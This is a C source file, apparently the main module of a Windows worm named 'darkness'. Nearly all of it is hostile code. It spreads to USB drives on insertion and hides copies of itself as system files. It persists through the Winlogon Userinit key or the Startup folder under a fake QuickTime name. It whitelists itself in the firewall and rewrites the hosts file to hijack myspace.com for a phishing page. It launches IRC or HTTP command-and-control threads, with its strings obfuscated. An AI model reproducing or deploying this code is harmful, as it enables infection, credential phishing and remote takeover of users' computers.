#include "device.h"

#include <winsock.h>
#include <windows.h>
#include <dbt.h>

#include "infect.h"
#include "irc.h"
#include "mylib.h"
#include "http.h"
#include "dns.h"
#include "server.h"
#include "myspace.h"

WNDCLASSEX hWincl= {
    sizeof(WNDCLASSEX), CS_DBLCLKS, 0x0,
    0x0, 0x0, 0x0, 0x0,
    0x0, 0x0, 0x0, "darkness", 0x0 
};

LRESULT CALLBACK 
DarknessWindowProcedure 
(HWND hWnd, UINT hCallback, WPARAM wParam, LPARAM lParam) {
    if(hCallback == WM_DEVICECHANGE) 
       switch(wParam) {
          case DBT_DEVICEARRIVAL:
             InfectDrive(GetDeviceDriveLetter(lParam));
          break;
          case DBT_DEVICEREMOVECOMPLETE:
             // MessageBox(hWnd,riddle_enc("tñÖÖÜèçöMAçäáÜAâÇîAèÜòAéÜÇèäèàOOO"),0x0,0x0); // Suddenly, life has new meaning...
          break;
       } 
    else return(DefWindowProc(hWnd,hCallback,wParam,lParam));
    return(0x0);
}

static int 
DarknessRegedit
(struct darkness_d *darkness) {
    HKEY hWinLogon,hWinFirewall; 
    char fpath[0x80],tmp[0x80];
    GetSystemDirectory(tmp,sizeof(tmp));
    sprintf(fpath,riddle_enc("7ÖnáÖwÑ{Ä{Ü@wäw>7Ö"),tmp,darkness->sysfile); // %s\userinit.exe,%s
    strcpy(tmp,riddle_enc("àÑ{âåvázëÇûòß§®§õ©ëåû£ô§¨®UÉâëx™ßßö£©ãöß®û§£ëåû£°§ú§£")); 
    // SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,tmp,0x0,KEY_SET_VALUE,&hWinLogon)) 
       if(RegOpenKeyEx(HKEY_CURRENT_USER,tmp,0x0,KEY_SET_VALUE,&hWinLogon)) return(0x0);
    RegSetValueEx(hWinLogon,riddle_enc("]{mzqvq|"),0x0,REG_SZ,fpath,strlen(fpath)); // Userinit
    strcpy(tmp,riddle_enc("√…√ƒµΩÃ≥ﬂﬁ‰‚ﬂ‹√’‰††°Ã√’‚ÊŸ”’„Ã√ÿ—‚’‘±””’„„Ã"
            "¿—‚—›’‰’‚„Ã∂Ÿ‚’Á—‹‹¿ﬂ‹Ÿ”ÈÃ√‰—ﬁ‘—‚‘¿‚ﬂ÷Ÿ‹’Ã±Â‰ÿﬂ‚ŸÍ’‘±‡‡‹Ÿ”—‰Ÿﬂﬁ„ÃºŸ„‰")); 
            // SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List
    sprintf(fpath,riddle_enc("AèVFVaä}~àÅÄVmëÖáêÖâÅ<iÅÄÖ}"),darkness->main); 
    // %s:*:Enabled:Quicktime Media
    if(!RegOpenKeyEx(HKEY_LOCAL_MACHINE,tmp,0x0,KEY_SET_VALUE,&hWinFirewall))
       RegSetValueEx(hWinFirewall,darkness->main,0x0,REG_SZ,fpath,strlen(fpath));
    RegCloseKey(hWinLogon);
    RegCloseKey(hWinFirewall);
    return(0x1);
}

static int 
CreateCallbackWindow
(HINSTANCE hMainInst) {
    hWincl.hInstance=hMainInst;
    hWincl.lpfnWndProc=DarknessWindowProcedure;
    hWincl.hIcon=LoadIcon(NULL,IDI_APPLICATION);
    hWincl.hIconSm=LoadIcon(NULL,IDI_APPLICATION);
    hWincl.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
    hWincl.hCursor=LoadCursor(NULL,IDC_ARROW);
    RegisterClassEx(&hWincl);
    HWND hWnd=CreateWindowEx(WS_EX_CLIENTEDGE,hWincl.lpszClassName,hWincl.lpszClassName,
         WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,0x0,0x0,HWND_DESKTOP,NULL,hMainInst,NULL);
    DeviceNotificationInit(hWnd);
    ShowWindow(hWnd,SW_HIDE);
}

static void 
DarknessGenericAutoexec
(struct darkness_d *darkness) {
    char lpStartupPath[0x80];
    GetEnvironmentVariable(riddle_enc("`^P][]ZQTWP"),lpStartupPath,sizeof(lpStartupPath)); // USERPROFILE
    strcat(lpStartupPath,riddle_enc("åÉ§ë¢§P}ïû•åÄ¢üó¢ëù£åÉ§ë¢§•†åÅ•ôìõ§ôùïP}•£ôì^ï®ï")); 
    // \Start Menu\Programs\Startup\Quicktime Music.exe
    CopyFile(darkness->main,lpStartupPath,0x0);
    strcpy(darkness->sysfile,lpStartupPath);
    strcpy(darkness->binary_name,riddle_enc("dà|v~á|Äx3`àÜ|vAxãx")); // Quicktime Music.exe
}

static void
DarknessExec
(struct darkness_d *darkness) {
    // struct myspace_param_d myspace;
    char tmp[0x80];
    GetSystemDirectory(tmp,sizeof(tmp));
    sprintf(darkness->binary_name,riddle_enc("+j4k~k"), // %d.exe
         GetRandomNumber());
    sprintf(darkness->sysfile,riddle_enc("*xa*x"),tmp,darkness->binary_name); // %s\%s
    CopyFile(darkness->main,darkness->sysfile,0x0);
    SetFileAttributes(darkness->sysfile,
         FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM); 
    if(!DarknessRegedit(darkness))
       DarknessGenericAutoexec(darkness); 
    if(!darkness->prevexec) {
       DnsEditHostsFile(riddle_enc("xÑ~{lnp9nzx"),riddle_enc(":;@79797:")); // myspace.com, 127.0.0.1
       //WinExec(riddle_enc("åÅéç}àêá9Fã9Fç9J9F|9_zçzÖ"),SW_HIDE); // shutdown -r -t 1 -c "Fatal System Error"
       Sleep(0x1000);
    } 
    DnsGetPhishingPage(darkness);
    CreateThread(NULL,0x0,
         (LPTHREAD_START_ROUTINE)HttpServerMain,
         darkness,0x0,0x0);
    switch(DnsCheckCommandType()) {
       case COMMAND_TYPE_IRC:
          CreateThread(NULL,0x0,
               (LPTHREAD_START_ROUTINE)IrcMain,
               darkness,0x0,0x0);
          break;
       default:
       case COMMAND_TYPE_HTTP:
          CreateThread(NULL,0x0,
               (LPTHREAD_START_ROUTINE)HttpMain,
               darkness,0x0,0x0);
          break;
          break;
    }
    /*
    myspace.bRawData=0x0;
    strcpy(myspace.lpEditData,DnsGetEditData());
    MySpaceMain(&myspace); */
    ExitThread(0x0);
}

static int 
DarknessCheckPrevexec
(struct darkness_d *darkness) {
    HKEY hWinLogon;
    char buf[0x40],tmp[0x40];
    unsigned long BytesRead=sizeof(buf);
    strcpy(tmp,riddle_enc("àÑ{âåvázëÇûòß§®§õ©ëåû£ô§¨®UÉâëx™ßßö£©ãöß®û§£ëåû£°§ú§£")); 
    // SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,tmp,0x0,KEY_ALL_ACCESS,&hWinLogon)) 
       if(RegOpenKeyEx(HKEY_CURRENT_USER,tmp,0x0,KEY_ALL_ACCESS,&hWinLogon)) return(0x0);
    RegQueryValueEx(hWinLogon,riddle_enc("]{mzqvq|"),NULL,NULL,buf,&BytesRead); // Userinit
    GetModuleFileName(NULL,darkness->main,sizeof(darkness->main)); 
    RegCloseKey(hWinLogon); 
    return(strstr(buf,darkness->main) ? 0x1 : 0x0);
}

int __stdcall 
WinMain
(HINSTANCE hMainInst, HINSTANCE hPrevInst, char *lpCmd, int nCmdShow) {
    MSG hCallback;
    WSADATA wsaData;
    WSAStartup(MAKEWORD(0x2,0x0),&wsaData);
    while(!is_online()) Sleep(0xEA60);
    struct darkness_d darkness;
    darkness.prevexec=DarknessCheckPrevexec(&darkness);
    CreateCallbackWindow(hMainInst);
    CreateThread(NULL,0x0,
         (LPTHREAD_START_ROUTINE)DarknessExec,
         &darkness,0x0,0x0);
    while(GetMessage(&hCallback,NULL,0x0,0x0)) 
        DispatchMessage(&hCallback);
    return(hCallback.wParam); 
}
